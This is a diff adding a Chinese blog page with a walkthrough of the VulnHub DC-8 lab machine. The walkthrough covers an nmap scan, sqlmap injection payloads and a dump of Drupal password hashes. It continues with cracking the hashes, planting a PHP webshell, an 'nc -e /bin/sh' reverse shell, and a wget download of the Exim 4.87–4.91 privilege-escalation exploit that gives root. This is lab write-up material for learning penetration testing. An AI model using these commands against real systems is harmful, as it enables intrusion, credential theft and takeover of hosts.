@@ -1,0 +1,239 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>vulnhub-DC-8 | Six_plum</title><meta name="author" content="Six_plum"><meta name="copyright" content="Six_plum"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub-DC-8信息收集还是nmap扫一下端口 1234567891011121314151617181920212223242526272829303132333435└─# nmap -A -p1-65535 192.168.20.138Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-11-25 18:46 CSTNmap scan">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-DC-8">
+<meta property="og:url" content="https://hshdgyq.github.io/2024/11/25/vulnhub-DC-8/index.html">
+<meta property="og:site_name" content="Six_plum">
+<meta property="og:description" content="vulnhub-DC-8信息收集还是nmap扫一下端口 1234567891011121314151617181920212223242526272829303132333435└─# nmap -A -p1-65535 192.168.20.138Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-11-25 18:46 CSTNmap scan">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hshdgyq.github.io/img/background.jpg">
+<meta property="article:published_time" content="2024-11-25T12:58:24.000Z">
+<meta property="article:modified_time" content="2024-11-25T14:05:01.990Z">
+<meta property="article:author" content="Six_plum">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hshdgyq.github.io/img/background.jpg"><link rel="shortcut icon" href="/img/upper.jpg"><link rel="canonical" href="https://hshdgyq.github.io/2024/11/25/vulnhub-DC-8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub-DC-8',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-25 22:05:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Six_plum</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub-DC-8</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-25T12:58:24.000Z" title="发表于 2024-11-25 20:58:24">2024-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-25T14:05:01.990Z" title="更新于 2024-11-25 22:05:01">2024-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub-DC-8"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub-DC-8"><a href="#vulnhub-DC-8" class="headerlink" title="vulnhub-DC-8"></a>vulnhub-DC-8</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>还是nmap扫一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap -A -p1-65535 192.168.20.138</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 18:46 CST</span><br><span class="line">Nmap scan report for 192.168.20.138</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br><span class="line">MAC Address: 00:0C:29:1B:50:44 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.32 ms 192.168.20.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.49 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>看看80端口的服务，发现还是drupal，但是这次公开的漏洞还是没利用成功，应该是打补丁的，当把鼠标光标靠近蓝字时发现这次访问是用的get传参，那么很可能是sql注入，用sqlmap跑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.20.138/?nid=1&quot;</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: nid=1 AND 5944=5944</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: nid=1 AND (SELECT 3337 FROM(SELECT COUNT(*),CONCAT(0x7178766b71,(SELECT (ELT(3337=3337,1))),0x71786b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: nid=1 AND (SELECT 5434 FROM (SELECT(SLEEP(5)))wqBX)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: nid=-9850 UNION ALL SELECT CONCAT(0x7178766b71,0x564868785a6f6e56754157534e7a534e6b6e49534c53534e494474764256526f586f597369476c79,0x71786b7171)-- -</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>确实是sql注入，直接拿用户数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.20.138/?nid=1&quot; -D d7db -T users -C name,mail,pass --dump --batch</span><br><span class="line"></span><br><span class="line">+--------+-----------------------+---------------------------------------------------------+</span><br><span class="line">| name   | mail                  | pass                                                    |</span><br><span class="line">+--------+-----------------------+---------------------------------------------------------+</span><br><span class="line">| admin  | dcau-user@outlook.com | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john   | john@blahsdfsfd.org   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+--------+-----------------------+---------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>很明显john就是提示要利用这个工具爆破密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆出来是turtle，但是没看到登录页面，就是把首页换了，但是前面几个靶机知道这个框架的登录目录就是在&#x2F;user&#x2F;login，直接登录</p>
+<p>登录后我原本想像之前一样直接写马子访问，发现不解析php，插件也传不了，翻了半天发现contact up页面中的webform中的formsetting支持php，那就直接写个马子 ，要注意一定要确认消息中写点消息，不然解析不成功</p>
+<p><img src="/2024/11/25/vulnhub-DC-8/1.png"></p>
+<p><img src="/2024/11/25/vulnhub-DC-8/2.png"></p>
+<p>可以蚁剑连接弹个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.20.138 1111</span><br><span class="line"></span><br><span class="line">nc -lvvp 1111</span><br></pre></td></tr></table></figure>
+
+<h2 id="exim提权"><a href="#exim提权" class="headerlink" title="exim提权"></a>exim提权</h2><p>要提权，还是老套路，直接先看suid和sudo，这里看到有exim</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/var/www/html$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure>
+
+<p>还是exim4，猜测有漏洞，看看版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exim --version</span><br><span class="line">Exim version 4.89 #2 built 14-Jun-2017 05:03:07</span><br></pre></td></tr></table></figure>
+
+<p>查漏洞库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">└─# searchsploit exim 4                                                                       </span><br><span class="line">------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                           |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Dovecot with Exim - &#x27;sender_address&#x27; Remote Command Execution                                                            | linux/remote/25297.txt</span><br><span class="line">Exim - &#x27;GHOST&#x27; glibc gethostbyname Buffer Overflow (Metasploit)                                                          | linux/remote/36421.rb</span><br><span class="line">Exim - &#x27;perl_startup&#x27; Local Privilege Escalation (Metasploit)                                                            | linux/local/39702.rb</span><br><span class="line">Exim - &#x27;sender_address&#x27; Remote Code Execution                                                                            | linux/remote/25970.py</span><br><span class="line">Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                            | linux/local/40054.c</span><br><span class="line">Exim 4.41 - &#x27;dns_build_reverse&#x27; Local Buffer Overflow                                                                    | linux/local/756.c</span><br><span class="line">Exim 4.41 - &#x27;dns_build_reverse&#x27; Local Read Emails                                                                        | linux/local/1009.c</span><br><span class="line">Exim 4.42 - Local Privilege Escalation                                                                                   | linux/local/796.sh</span><br><span class="line">Exim 4.43 - &#x27;auth_spa_server()&#x27; Remote                                                                                   | linux/remote/812.c</span><br><span class="line">Exim 4.63 - Remote Command Execution                                                                                     | linux/remote/15725.pl</span><br><span class="line">Exim 4.84-3 - Local Privilege Escalation                                                                                 | linux/local/39535.sh</span><br><span class="line">Exim 4.87 - 4.91 - Local Privilege Escalation                                                                            | linux/local/46996.sh</span><br><span class="line">Exim 4.87 / 4.91 - Local Privilege Escalation (Metasploit)                                                               | linux/local/47307.rb</span><br><span class="line">Exim 4.87 / 4.91 - Local Privilege Escalation (Metasploit)                                                               | linux/local/47307.rb</span><br><span class="line">Exim 4.87 &lt; 4.91 - (Local / Remote) Command Execution                                                                    | linux/remote/46974.txt</span><br><span class="line">Exim 4.89 - &#x27;BDAT&#x27; Denial of Service                                                                                     | multiple/dos/43184.txt</span><br><span class="line">exim 4.90 - Remote Code Execution                                                                                        | linux/remote/45671.py</span><br><span class="line">Exim &lt; 4.86.2 - Local Privilege Escalation                                                                               | linux/local/39549.txt</span><br><span class="line">Exim &lt; 4.90.1 - &#x27;base64d&#x27; Remote Code Execution                                                                          | linux/remote/44571.py</span><br><span class="line">Exim ESMTP 4.80 - glibc gethostbyname Denial of Service                                                                  | linux/dos/35951.py</span><br><span class="line">Exim Internet Mailer 3.35/3.36/4.10 - Format String                                                                      | linux/local/22066.c</span><br><span class="line">Exim Sender 3.35 - Verification Remote Stack Buffer Overrun                                                              | linux/remote/24093.c</span><br><span class="line">Exim4 &lt; 4.69 - string_format Function Heap Buffer Overflow (Metasploit)                                                  | linux/remote/16925.rb</span><br><span class="line">MPlayer 0.9/1.0 - Remote HTTP Header Buffer Overflow                                                                     | linux/dos/23896.txt</span><br><span class="line">OpenBSD 3.3 - &#x27;Semget()&#x27; Integer Overflow (1)                                                                            | openbsd/local/23046.c</span><br><span class="line">OpenBSD 3.3 - &#x27;Semget()&#x27; Integer Overflow (2)                                                                            | openbsd/local/23047.c</span><br><span class="line">PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution                                                                 | php/webapps/42221.py</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>想直接利用4.89版本漏洞的，但是没有直接利用的脚本，这里看到有4.87 - 4.91 的利用脚本，那就用这个脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">下载下来：</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /tmp</span><br><span class="line"></span><br><span class="line">搭建python web服务</span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">下载</span><br><span class="line">www-data@dc-8:/tmp$ wget http://192.168.20.129/46996.sh</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本有两个利用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m setuid</span><br><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure>
+
+<p>第一个没提权成功，第二个成功了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ ./46996.sh -m netcat</span><br><span class="line">./46996.sh -m netcat</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Delivering netcat payload...</span><br><span class="line">220 dc-8 ESMTP Exim 4.89 Mon, 25 Nov 2024 23:35:17 +1000</span><br><span class="line">250 dc-8 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with &quot;.&quot; on a line by itself</span><br><span class="line">250 OK id=1tFZFF-0000HX-Gz</span><br><span class="line">221 dc-8 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">localhost [127.0.0.1] 31337 (?) open</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">root@dc-8:/var/spool/exim4# ls</span><br></pre></td></tr></table></figure>
+
+<p>至此靶机攻克</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机还是很老套，并且比较简单，可能找php解析哪里难找一点，提权过于简单了，知识点：sql注入、exim提权</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://hshdgyq.github.io">Six_plum</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://hshdgyq.github.io/2024/11/25/vulnhub-DC-8/">https://hshdgyq.github.io/2024/11/25/vulnhub-DC-8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hshdgyq.github.io" target="_blank">Six_plum</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a></div><div class="post_share"><div class="social-share" data-image="/img/background.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/21/vulnhub-DC-7/"><img class="next-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub-DC-7</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/11/12/vulnhub-DC-1/" title="vulnhub-DC-1"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-12</div><div class="title">vulnhub-DC-1</div></div></a></div><div><a href="/2024/11/14/vulnhub-DC-3/" title="vulnhub-DC-3"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-14</div><div class="title">vulnhub-DC-3</div></div></a></div><div><a href="/2024/11/13/vulnhub-DC-2/" title="vulnhub-DC-2"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-13</div><div class="title">vulnhub-DC-2</div></div></a></div><div><a href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-20</div><div class="title">vulnhub-DC-4</div></div></a></div><div><a href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-20</div><div class="title">vulnhub-DC-5</div></div></a></div><div><a href="/2024/11/21/vulnhub-DC-6/" title="vulnhub-DC-6"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-21</div><div class="title">vulnhub-DC-6</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Six_plum</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hshdgyq"><i class="fab fa-github"></i><span>github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/hshdgyq" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1952023661@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">记录一些刷题日志，防止走丢。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub-DC-8"><span class="toc-number">1.</span> <span class="toc-text">vulnhub-DC-8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exim%E6%8F%90%E6%9D%83"><span 